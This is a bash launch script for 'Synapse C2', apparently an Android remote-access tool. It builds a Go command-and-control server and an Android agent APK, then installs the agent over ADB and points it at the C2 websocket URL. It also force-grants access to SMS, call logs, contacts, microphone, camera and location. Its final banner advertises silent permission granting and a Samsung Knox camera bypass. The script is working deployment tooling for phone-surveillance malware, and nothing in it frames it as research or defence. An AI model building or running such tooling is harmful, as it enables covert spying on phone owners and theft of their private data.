#!/bin/bash
# ═══════════════════════════════════════════════════════
# SYNAPSE — ONE-COMMAND LAUNCH + STATUS CHECK
# Usage: bash run.sh          # build + deploy + launch
#        bash run.sh --status # check everything, report status
#        bash run.sh --build  # build only (APK + server)
# ═══════════════════════════════════════════════════════
set -e

ROOT="$(cd "$(dirname "$0")" && pwd)"
IP=$(ip addr show wlo1 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
GOROOT="$HOME/go"
GOPATH="$HOME/go-projects"
JAVA_HOME="$HOME/.local/share/JetBrains/Toolbox/apps/android-studio/jbr"
DEVICE="a2a99ec51033f84f"

export PATH="$GOROOT/bin:$GOPATH/bin:$PATH"
export JAVA_HOME

MODE="${1:-launch}"

# ═══════════════════════════════════════════════════════
# STATUS CHECK
# ═══════════════════════════════════════════════════════
if [ "$MODE" = "--status" ] || [ "$MODE" = "-s" ]; then
    echo "╔══════════════════════════════════════════╗"
    echo "║       SYNAPSE — Status Report          ║"
    echo "╠══════════════════════════════════════════╣"

    # 1. Network
    echo -n "║ Network (IP):  "
    if [ -n "$IP" ]; then
        echo "$IP"
    else
        echo "NOT FOUND (check wlo1/eth0)"
    fi

    # 2. Java / Android SDK
    echo -n "║ JAVA_HOME:     "
    if [ -d "$JAVA_HOME" ]; then
        echo "$(ls "$JAVA_HOME" 2>/dev/null | head -1) ✓"
    else
        echo "MISSING ✗"
    fi

    # 3. Go
    echo -n "║ Go:            "
    if command -v go &>/dev/null; then
        echo "$(go version) ✓"
    else
        echo "NOT FOUND ✗"
    fi

    # 4. ADB + device
    echo -n "║ ADB:           "
    if command -v adb &>/dev/null; then
        echo "found ✓"
    else
        echo "NOT FOUND ✗"
    fi

    echo -n "║ Device ($DEVICE): "
    if adb devices 2>/dev/null | grep -q "$DEVICE"; then
        ADB_STATE=$(adb devices 2>/dev/null | grep "$DEVICE" | awk '{print $2}')
        echo "$ADB_STATE ✓"
    else
        echo "NOT CONNECTED ✗"
    fi

    # 5. Server binary
    echo -n "║ Server binary: "
    if [ -f /tmp/synapse-server ]; then
        SIZE=$(stat -c%s /tmp/synapse-server 2>/dev/null || echo "?")
        echo "/tmp/synapse-server ($SIZE bytes) ✓"
    else
        echo "NOT BUILT ✗"
    fi

    # 6. Server running?
    echo -n "║ Server (8443): "
    SERVER_PID=$(pgrep -f synapse-server 2>/dev/null || true)
    if [ -n "$SERVER_PID" ]; then
        echo "PID=$SERVER_PID ✓"
    else
        echo "NOT RUNNING ✗"
    fi

    # 7. Server health
    echo -n "║ Server health: "
    HEALTH=$(curl -k -s "https://localhost:8443/api/health" 2>/dev/null || echo "DOWN")
    if echo "$HEALTH" | grep -q "ok"; then
        echo "HEALTHY ✓"
    else
        echo "UNREACHABLE ✗"
    fi

    # 8. Devices API
    echo -n "║ Registrations: "
    DEVS=$(curl -k -s "https://localhost:8443/api/devices" 2>/dev/null || echo '{"devices":[]}')
    DEV_COUNT=$(echo "$DEVS" | python3 -c "import json,sys; print(len(json.load(sys.stdin).get('devices',[])))" 2>/dev/null || echo "0")
    echo "$DEV_COUNT device(s)"
    if [ "$DEV_COUNT" -gt 0 ]; then
        echo "$DEVS" | python3 -c "
import json,sys
d=json.load(sys.stdin)
for x in d.get('devices',[]):
    print(f'║   {x[\"id\"][:16]}... online={x[\"online\"]} model={x[\"info\"].get(\"model\",\"?\")}')
" 2>/dev/null
    fi

    # 9. APK
    APK="$ROOT/Umbra-Client/app/build/outputs/apk/debug/app-debug.apk"
    echo -n "║ APK:           "
    if [ -f "$APK" ]; then
        SIZE=$(stat -c%s "$APK" 2>/dev/null || echo "?")
        SIZE_MB=$(echo "scale=1; $SIZE/1048576" | bc 2>/dev/null || echo "?")
        echo "$APK (${SIZE_MB}MB) ✓"
    else
        echo "NOT BUILT ✗"
    fi

    # 10. Code summary
    echo "╠══════════════════════════════════════════╣"
    echo "║ Source stats:"
    KT_FILES=$(find "$ROOT/Umbra-Client" -name "*.kt" 2>/dev/null | wc -l)
    KT_LINES=$(find "$ROOT/Umbra-Client" -name "*.kt" -exec cat {} + 2>/dev/null | wc -l)
    GO_FILES=$(find "$ROOT/Umbra-Server" -name "*.go" 2>/dev/null | wc -l)
    GO_LINES=$(find "$ROOT/Umbra-Server" -name "*.go" -exec cat {} + 2>/dev/null | wc -l)
    echo "║   Kotlin: $KT_FILES files, $KT_LINES lines"
    echo "║   Go:     $GO_FILES files, $GO_LINES lines"

    echo "╚══════════════════════════════════════════╝"
    exit 0
fi

# ═══════════════════════════════════════════════════════
# BUILD ONLY
# ═══════════════════════════════════════════════════════
if [ "$MODE" = "--build" ] || [ "$MODE" = "-b" ]; then
    echo "╔══════════════════════════════════════════╗"
    echo "║       SYNAPSE — Build Only             ║"
    echo "╚══════════════════════════════════════════╝"

    # Build server
    if [ ! -f /tmp/synapse-server ] || [ "$ROOT/Umbra-Server/synapse-c2/app/synapse-c2" -nt /tmp/synapse-server ]; then
        echo "[1/2] Building Go server..."
        cd "$ROOT/Umbra-Server/synapse-c2/app/synapse-c2"
        go build -o /tmp/synapse-server .
        echo "  ✓ Server built ($(stat -c%s /tmp/synapse-server) bytes)"
    else
        echo "[1/2] Server up-to-date"
    fi

    # Build Android
    echo "[2/2] Building Android APK..."
    cd "$ROOT/Umbra-Client"
    ./gradlew assembleDebug -q 2>/dev/null
    APK="$ROOT/Umbra-Client/app/build/outputs/apk/debug/app-debug.apk"
    if [ -f "$APK" ]; then
        SIZE_MB=$(echo "scale=1; $(stat -c%s "$APK")/1048576" | bc)
        echo "  ✓ APK built (${SIZE_MB}MB)"
    else
        echo "  ✗ APK build failed"
        exit 1
    fi
    exit 0
fi

# ═══════════════════════════════════════════════════════
# FULL LAUNCH (default)
# ═══════════════════════════════════════════════════════

echo "╔══════════════════════════════════════════╗"
echo "║       SYNAPSE C2 — Quick Launch        ║"
echo "╠══════════════════════════════════════════╣"
echo "║ IP: $IP"
echo "║ Device: $DEVICE"
echo "╚══════════════════════════════════════════╝"

# 1. Build server if needed
if [ ! -f /tmp/synapse-server ] || [ "$ROOT/Umbra-Server/synapse-c2/app/synapse-c2" -nt /tmp/synapse-server ]; then
    echo "[1/4] Building Go server..."
    cd "$ROOT/Umbra-Server/synapse-c2/app/synapse-c2"
    go build -o /tmp/synapse-server .
fi

# 2. Build Android
APK="$ROOT/Umbra-Client/app/build/outputs/apk/debug/app-debug.apk"
echo "[2/4] Building Android APK..."
cd "$ROOT/Umbra-Client"
./gradlew assembleDebug -q 2>/dev/null

# 3. Kill old server & start new
echo "[3/4] Starting C2 server..."
fuser -k 8443/tcp 2>/dev/null || true
sleep 1
/tmp/synapse-server &
sleep 2

# Verify server is running
if ! pgrep -f synapse-server > /dev/null 2>&1; then
    echo "  ✗ Server failed to start!"
    exit 1
fi
echo "  ✓ Server PID: $(pgrep -f synapse-server)"

# 4. Install & launch agent
echo "[4/4] Deploying agent..."
adb install -r "$APK" 2>/dev/null
sleep 2
# Clear old prefs and set C2 URL to current IP
adb shell pm clear org.synapse.core 2>/dev/null || true
sleep 1
adb shell mkdir -p /data/data/org.synapse.core/shared_prefs 2>/dev/null || true
adb shell "echo 'wss://$IP:8443/c2' > /data/data/org.synapse.core/shared_prefs/synapse_c2_url" 2>/dev/null || true
for perm in POST_NOTIFICATIONS CAMERA ACCESS_FINE_LOCATION ACCESS_COARSE_LOCATION \
    READ_MEDIA_IMAGES READ_MEDIA_VIDEO READ_PHONE_STATE \
    READ_SMS READ_CALL_LOG READ_CONTACTS RECORD_AUDIO; do
    adb shell pm grant org.synapse.core android.permission.$perm 2>/dev/null || true
done
adb shell am force-stop org.synapse.core 2>/dev/null || true
sleep 1
adb shell am start -n org.synapse.core/.MainActivity 2>/dev/null || true

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║  Dashboard: https://$IP:8443           ║"
echo "║  Health:    https://$IP:8443/api/health║"
echo "║  Server PID: $(pgrep -f synapse-server || echo '?')                        ║"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "Waiting for agent connection..."
for i in 1 2 3 4 5; do
  sleep 4
  STATUS=$(curl -k -s "https://localhost:8443/api/devices" 2>/dev/null | python3 -c "
import json,sys
d=json.load(sys.stdin)
for x in d.get('devices',[]):
    print(f'{x[\"id\"][:16]}... online={x[\"online\"]} model={x[\"info\"].get(\"model\",\"?\")}')
" 2>/dev/null)
  echo "  [$i] $STATUS"
  if echo "$STATUS" | grep -q "online=True"; then
    echo ""
    echo "╔══════════════════════════════════════════╗"
    echo "║  AGENT ONLINE — Ready                   ║"
    echo "╠══════════════════════════════════════════╣"
    echo "║  Dashboard: https://$IP:8443            ║"
    echo "║  Fixed in this build:                   ║"
    echo "║   ✓ SilentPermissionGrant (coroutines)  ║"
    echo "║   ✓ Camera Knox bypass (multi-path)     ║"
    echo "║   ✓ GPS immediate (cached+network)      ║"
    echo "╚══════════════════════════════════════════╝"
    exit 0
  fi
done
echo "Agent did not come online — check: adb logcat -s Synapse:V"
